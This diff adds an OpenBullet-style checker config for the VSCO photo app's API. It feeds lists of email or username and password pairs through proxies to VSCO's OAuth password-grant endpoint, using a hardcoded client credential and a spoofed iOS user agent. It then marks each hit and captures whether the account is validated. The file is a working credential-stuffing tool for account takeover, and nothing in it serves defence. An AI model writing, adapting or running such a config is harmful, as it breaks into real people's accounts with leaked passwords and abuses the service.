@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "VSCO (API)",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-17T09:37:45.5968923-04:00",
+  "AdditionalInfo": "",
+  "Author": "Howzi",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.vsco.co/2.0/oauth/passwordgrant" 
+  CONTENT "username=<USER>&password=<PASS>&grant_type=password" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: VSCO/11225 CFNetwork/975.0.3 Darwin/18.2.0" 
+  HEADER "Authorization: Basic dnV6ZWRhemViZWp1Z2UzeWh1Z3k5ZXFlbWE1YTV1cmU5dTJ1c2FyYTpyeWplNXlydXBlemUyZXN5YmVyeQ==" 
+  HEADER "x-client-platform: ios" 
+  HEADER "x-client-build: 11225" 
+  HEADER "X-CLIENT-LOCALE: en" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "errorType" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "access_token" 
+
+REQUEST GET "https://api.vsco.co/2.0/users" 
+  
+  HEADER "User-Agent: VSCO/11225 CFNetwork/975.0.3 Darwin/18.2.0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "x-client-build: 11225" 
+  HEADER "x-client-platform: ios" 
+  HEADER "Authorization: Bearer <access_token>" 
+  HEADER "X-CLIENT-LOCALE: en" 
+
+PARSE "<SOURCE>" JSON "account_validated" -> CAP "Validated" 
+
